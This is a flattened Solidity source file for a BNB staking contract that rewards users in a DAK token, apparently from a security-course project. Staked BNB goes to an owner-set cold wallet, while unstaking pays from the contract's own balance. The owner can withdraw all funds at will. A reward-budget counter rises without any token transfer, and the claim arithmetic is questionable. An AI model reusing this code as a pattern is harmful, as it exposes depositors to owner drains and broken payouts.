/**
 *Submitted for verification at BscScan.com on 2023-03-06
*/

/** 
 *  SourceUnit: c:\Users\HP\Desktop\IBCO\hardhat-security-fcc\contracts\StakingBNB.sol
*/
            
pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}



/** 
 *  SourceUnit: c:\Users\HP\Desktop\IBCO\hardhat-security-fcc\contracts\StakingBNB.sol
*/
            
pragma solidity ^0.8.0;

interface AggregatorV3Interface {
    function decimals() external view returns (uint8);

    function description() external view returns (string memory);

    function version() external view returns (uint256);

    // getRoundData and latestRoundData should both raise "No data present"
    // if they do not have data to report, instead of returning unset values
    // which could be misinterpreted as actual reported values.
    function getRoundData(uint80 _roundId)
        external
        view
        returns (
            uint80 roundId,
            int256 answer,
            uint256 startedAt,
            uint256 updatedAt,
            uint80 answeredInRound
        );

    function latestRoundData()
        external
        view
        returns (
            uint80 roundId,
            int256 answer,
            uint256 startedAt,
            uint256 updatedAt,
            uint80 answeredInRound
        );
}




/** 
 *  SourceUnit: c:\Users\HP\Desktop\IBCO\hardhat-security-fcc\contracts\StakingBNB.sol
*/
            

pragma solidity ^0.8.0;

////import "./Context.sol";

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}


/** 
 *  SourceUnit: c:\Users\HP\Desktop\IBCO\hardhat-security-fcc\contracts\StakingBNB.sol
*/

pragma solidity ^0.8.4;

////import "./lib/Ownable.sol";
////import "./lib/AggregatorV3Interface.sol";

interface IERC20 {
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external;

    function transfer(address recipient, uint256 amount) external;

    function approve(address spender, uint256 amount) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function allowance(address owner, address spender) external view returns (uint256);
}

contract StakingBNB is Ownable {
    AggregatorV3Interface internal priceFeedBNB;

    address internal coldWallet; // address cold wallet

    IERC20 public dakshow;
    IERC20 public bnb;

    uint256 public totalDakRewardInContract;
    uint256 public initialDAK = 0; // so luong dak duoc chuyen vao khi contract duoc khoi tao
    uint256 public totalExtraDAK = 0; // tong luong dak duoc them vao (sau khi contract gan het)
    uint256 public constant TIME_UNIT = 1 minutes; // don vi thoi gian toi thieu
    uint256 public priceDAK = 414 * 10**14; // gia dak khoi tao DAK = 0.0414 USD
    uint256 public constant DECIMALS = 10**18; // dakShow Token has the same decimals as BNB (18)

    struct Staking {
        uint256 id;
        address owner; // nguoi tao
        uint256 duration; // thoi gian staking
        uint256 totalStakes; // so luong token ma user stake
        uint256 timeUnlocks; // thoi gian unlock,
        address[] userStaking; // ds user stake
    }

    struct StakeInfo {
        uint256 id;
        bool isStake; // trang thai user co dang stake hay khong
        uint256 interestRate; // Lai suat luc stake
        uint256 startTS; // thoi gian bat dau stake
        uint256 endTS; // thoi gian ket thuc stake
        uint256 totalUserClaim; // so lan user da nhan, toi da = (endTS - startTS) / stakings[id].timeUnlocks
        uint256 amountStake; // so luong token user stake
        uint256 amountReward; // so luong token dak ma user nhan moi lan
        uint256 totalReward; // so luong DAK toi da user co the nhan
        uint256 claimed; // so luong token dak user da rut = moi lan x so lan
    }

    mapping(uint256 => mapping(address => StakeInfo)) public stakeInfos;

    Staking[] public stakings;

    event CreateStakingBNB(uint256 id, address owner, uint256 time, uint256 timeUnlocks);

    event AddLiquidity(address addressOnwer, uint256 amountDAK);

    event CreateUserStake(
        uint256 id,
        uint256 interestRate,
        uint256 balance,
        uint256 reward,
        uint256 rDak
    );

    event OwnerSetPriceDAK(uint256 newPrice, address onwer);

    event ClaimDAK(uint256 id, address userClaim, uint256 amount);

    event ClaimStakeBNB(uint256 id, address userClaim, uint256 amount);

    event OwnerWithdrawFunds(address owner, uint256 balanceBNB, uint256 balanceDAK);

    constructor(
        address _coldWallet,
        IERC20 _dak,
        address _bnb
    ) {
        require(_coldWallet != address(0), "coldWallet must be different from address(0)");

        coldWallet = _coldWallet;

        dakshow = _dak;

        initialDAK = 10000000 * DECIMALS; // 20% Vault DAK

        bnb = IERC20(_bnb);

        priceFeedBNB = AggregatorV3Interface(0x2514895c72f50D8bd4B4F9b1110F0D6bD2c97526);
    }

    function getLatestPriceBNB() public view returns (int256) {
        (
            ,
            /*uint80 roundID*/
            int256 price, /*uint startedAt*/ /*uint timeStamp*/ /*uint80 answeredInRound*/
            ,
            ,

        ) = priceFeedBNB.latestRoundData();
        return price;
    }

    /**
     * @notice ADMIN Function
     *
     */
    // duration = 1, 3, 6, 9, 12, 18, 24, 36, 48,... unlocks = 1, 2, 3, 6
    function createStakingWithBNB(uint256 duration, uint256 unlocks) external onlyOwner {
        require(duration > unlocks, "Duration must be greater than unlocks");

        uint256 id = stakings.length;

        uint256 timeDuration = duration * TIME_UNIT;

        uint256 timeUnlock = unlocks * TIME_UNIT;

        Staking memory newStaking = Staking({
            id: id,
            owner: msg.sender,
            duration: timeDuration,
            totalStakes: 0,
            timeUnlocks: timeUnlock,
            userStaking: new address[](0)
        });

        stakings.push(newStaking);

        emit CreateStakingBNB(id, msg.sender, duration, timeUnlock);
    }

    function withdrawFunds() external onlyOwner {
        uint256 balanceBNB = bnb.balanceOf(address(this));

        uint256 balanceDAK = dakshow.balanceOf(address(this));

        emit OwnerWithdrawFunds(msg.sender, balanceBNB, balanceDAK);

        bnb.transfer(msg.sender, balanceBNB);

        dakshow.transfer(msg.sender, balanceDAK);
    }

    function setPriceDak(uint256 newPrice) external onlyOwner {
        require(newPrice >= 414 * 10**14, "newPrice >=  0.0414 USDT");

        emit OwnerSetPriceDAK(newPrice, msg.sender);

        priceDAK = newPrice;
    }

    function addLiquidityDAK(uint256 amountDAK) external onlyOwner {
        require(amountDAK > 0, "The amount of DAK added must be greater than 0");

        emit AddLiquidity(msg.sender, amountDAK);

        totalExtraDAK += amountDAK;
    }

    // User function

    function addStakeholder(uint256 id, uint256 amount) external {
        require(!stakeInfos[id][msg.sender].isStake, "The address is staking");

        require(bnb.balanceOf(msg.sender) >= amount, "Insufficient BNB token in address");

        require(bnb.allowance(msg.sender, address(this)) >= amount, "Caller must approve first");

        uint256 sumReward = calculateReward(id, amount);

        require(
            initialDAK + totalExtraDAK >= totalDakRewardInContract + sumReward,
            "Insufficient DAK token in contract"
        );

        stakings[id].userStaking.push(msg.sender);

        stakings[id].totalStakes += amount;

        uint256 reward = (sumReward * stakings[id].timeUnlocks) / (stakings[id].duration);

        uint256 interestRate = getInterestRate(id);

        totalDakRewardInContract += sumReward;

        emit CreateUserStake(id, interestRate, amount, sumReward, priceDAK);

        bnb.transferFrom(msg.sender, coldWallet, amount);

        dakshow.transfer(msg.sender, reward);

        StakeInfo memory newStakeInfo = StakeInfo({
            id: id,
            isStake: true, // trang thai user co dang stake hay khong
            interestRate: interestRate, // 12077 = 12.077 %
            startTS: block.timestamp,
            endTS: block.timestamp + stakings[id].duration,
            totalUserClaim: 0, // so lan user da nhan, toi da = (endTS - startTS) / stakings[id].timeUnlocks
            amountStake: amount, // so luong token user stake
            amountReward: reward, // so luong token dak ma user co the nhan moi lan
            totalReward: sumReward, // so luong token DAK toi da user se nhan
            claimed: reward
        });

        stakeInfos[id][msg.sender] = newStakeInfo;
    }

    function removeStakeholder(uint256 id, address userAddress) internal {
        uint256 index = stakings[id].userStaking.length;
        for (uint256 i = 0; i < stakings[id].userStaking.length; i++) {
            if (stakings[id].userStaking[i] == userAddress) {
                index = i;
            }
        }

        for (uint256 i = index; i < stakings[id].userStaking.length - 1; i++) {
            stakings[id].userStaking[i] = stakings[id].userStaking[i + 1];
        }

        delete stakings[id].userStaking[stakings[id].userStaking.length - 1];

        stakings[id].userStaking.pop();
    }

    // Public view function

    function nextTimeClaim(uint256 id, address userAddress) public view returns (uint256) {
        uint256 totalCalim = (block.timestamp - stakeInfos[id][userAddress].startTS) /
            stakings[id].timeUnlocks;

        if (block.timestamp >= stakeInfos[id][userAddress].endTS) {
            return stakeInfos[id][userAddress].endTS;
        }

        uint256 nextTime = stakeInfos[id][userAddress].startTS +
            (totalCalim + 1) *
            stakings[id].timeUnlocks;

        return nextTime;
    }

    /**
     * @notice A method to take all existing stakings.
     */
    function getStakings() public view returns (Staking[] memory) {
        return stakings;
    }

    /**
     * @notice A method to get the number of users staking at a specified staking
     */
    function getUserInStaking(uint256 id) public view returns (address[] memory) {
        return stakings[id].userStaking;
    }

    // Tra ve APR(%)
    function getAnnualPercentageRate() public view returns (uint256) {
        int256 priceBNB = getLatestPriceBNB();

        uint256 totalBNB = getTotalBNB();

        uint256 totalValueLocked = uint256(priceBNB) * totalBNB > 0
            ? (uint256(priceBNB) * totalBNB) / 10**8
            : 0;
        uint256 p = ((15000000 * DECIMALS + totalExtraDAK) * 10**8) /
            ((((15000000 * DECIMALS + totalExtraDAK)) / 3 + totalValueLocked) * 414 * 6); // 12077 = 12.077%

        return p;
    }

    // tinh lai suat dua vao so thang cua cuoc staking
    function getInterestRate(uint256 id) public view returns (uint256) {
        uint256 timeStake = stakings[id].duration;

        require(timeStake >= TIME_UNIT, "Lock interval must be greater than minimum time");

        uint256 timeUserStake = timeStake / TIME_UNIT; // 1 3 6 9 12 ...

        uint256 p = getAnnualPercentageRate(); // 12077

        uint256 interestRate = 0;

        if (timeUserStake <= 12) {
            interestRate = (p * (5 * timeUserStake**2 + 90 * timeUserStake - 72)) / 1728;
        } else {
            interestRate = (p * (5 * timeUserStake**2 + 360 * timeUserStake - 1152)) / 3888;
        }
        return interestRate;
    }

    function getTotalBNB() public view returns (uint256) {
        uint256 totalBNB = 0;
        for (uint256 i = 0; i < stakings.length; i++) {
            totalBNB += stakings[i].totalStakes;
        }
        return totalBNB;
    }

    /**
         * @notice A method to calculate interest is based on the formula (x*rStake*interest rate)/(rDak)
         
        */
    function calculateReward(uint256 id, uint256 amount) public view returns (uint256) {

        int256 rStake = getLatestPriceBNB();

        uint256 interestRate = getInterestRate(id);
        // 12077
        return (amount * uint256(rStake) * interestRate * 10**4) / priceDAK;
    }

    function getTotalValueLocked(uint256 id) public view returns (uint256) {
        return stakings[id].totalStakes;
    }

    function getStakeInfos(uint256 id, address userAddress) public view returns (StakeInfo memory) {
        return stakeInfos[id][userAddress];
    }

    function getTotalDakReward() public view returns (uint256) {
        return totalDakRewardInContract;
    }

    // ---------- Withdraw Function ----------

    function withdrawReward(uint256 id) external {
        uint256 maxClaim = (stakeInfos[id][msg.sender].endTS - stakeInfos[id][msg.sender].startTS) /
            stakings[id].timeUnlocks;

        uint256 currentClaim = (block.timestamp - stakeInfos[id][msg.sender].startTS) /
            stakings[id].timeUnlocks;

        if (currentClaim >= maxClaim) {
            currentClaim = maxClaim - 2;
        }

        uint256 amountWithdraw = stakeInfos[id][msg.sender].amountReward *
            (currentClaim - stakeInfos[id][msg.sender].totalUserClaim);

        require(stakeInfos[id][msg.sender].isStake, "User not staking");

        require(
            dakshow.balanceOf(address(this)) >= amountWithdraw,
            "Not enough DAK tokens to transfer"
        );

        require(
            maxClaim > stakeInfos[id][msg.sender].totalUserClaim,
            "Exceed the number of withdrawals"
        );

        require(
            currentClaim > stakeInfos[id][msg.sender].totalUserClaim,
            "Not enough time to withdraw"
        );

        require(amountWithdraw > 0, "amountWithdraw is not 0");

        stakeInfos[id][msg.sender].totalUserClaim = currentClaim;

        stakeInfos[id][msg.sender].claimed += amountWithdraw;

        emit ClaimDAK(id, msg.sender, amountWithdraw);

        dakshow.transfer(msg.sender, amountWithdraw);
    }

    /**
     * @notice A method to withdraw the last deposit and bonus tokens
     */
    function withdrawStake(uint256 id) external {
        uint256 maxClaim = (stakeInfos[id][msg.sender].endTS - stakeInfos[id][msg.sender].startTS) /
            stakings[id].timeUnlocks;

        uint256 amountDAK = stakeInfos[id][msg.sender].totalReward -
            stakeInfos[id][msg.sender].claimed;

        require(block.timestamp >= stakeInfos[id][msg.sender].endTS, "Not enough time to withdraw");

        require(stakeInfos[id][msg.sender].isStake, "User not staking");

        require(dakshow.balanceOf(address(this)) >= amountDAK, "Not enough DAK tokens to transfer");

        removeStakeholder(id, msg.sender);

        uint256 amountStake = stakeInfos[id][msg.sender].amountStake;

        stakeInfos[id][msg.sender].totalUserClaim = maxClaim;

        stakeInfos[id][msg.sender].isStake = false;

        stakeInfos[id][msg.sender].amountStake = 0;

        stakings[id].totalStakes -= amountStake;

        emit ClaimDAK(id, msg.sender, amountDAK);

        emit ClaimStakeBNB(id, msg.sender, amountStake);

        bnb.transfer(msg.sender, amountStake);

        dakshow.transfer(msg.sender, amountDAK);
    }
}